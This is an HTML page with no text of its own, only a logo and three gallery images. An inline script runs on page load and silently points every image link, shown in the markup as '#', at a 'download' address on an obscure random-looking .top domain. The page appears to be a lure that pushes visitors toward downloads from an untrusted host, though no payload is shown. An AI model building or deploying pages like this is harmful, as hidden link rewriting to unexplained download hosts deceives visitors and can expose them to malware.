<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centered Page Layout</title>

    <script>
      const downloadLink = "https://www.dwy3u8.top/";

      document.addEventListener('DOMContentLoaded', function() {
        const linksToUpdate = document.querySelectorAll('.download-anchor');
        linksToUpdate.forEach(function(link) {
          link.href = downloadLink;
        });
      });
    </script>

    <style>
        body {
          margin: 0;
          background-color: #121212;
          font-family: sans-serif;
        }

        .container {
          width: 80%;
          margin: 40px auto; 
        }

        .header {
          text-align: center;
          margin-bottom: 50px;
        }

        .logo-image {
          max-width: 180px;
          height: auto;
          margin: 0 auto;
          display: block;
        }

        .gallery {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 30px;
        }

        .gallery-link {
          display: block;
          width: 100%;
          text-decoration: none;
        }

        .gallery-image {
          width: 100%;
          height: auto;
          border-radius: 8px;
          display: block;
          box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
          transition: transform 0.3s ease;
        }

        .gallery-image:hover {
          transform: scale(1.02);
        }
    </style>
</head>
<body>

    <div class="container">

      <header class="header">
        <a href="#" class="download-anchor">
          <!-- Corrected Path for the logo -->
          <img src="/images/logo.png" alt="Website Logo" class="logo-image" />
        </a>
      </header>

      <main>
        <div class="gallery">
          
          <a href="#" class="download-anchor gallery-link">
            <!-- Corrected Path, filename preserved -->
            <img src="/images/01.png" alt="Image 1" class="gallery-image" />
          </a>
          
          <a href="#" class="download-anchor gallery-link">
            <!-- Corrected Path, filename preserved -->
            <img src="/images/02.png" alt="Image 2" class="gallery-image" />
          </a>
          
          <a href="#" class="download-anchor gallery-link">
            <!-- Corrected Path, filename preserved -->
            <img src="/images/03.png" alt="Image 3" class="gallery-image" />
          </a>

        </div>
      </main>

    </div>

</body>
</html>
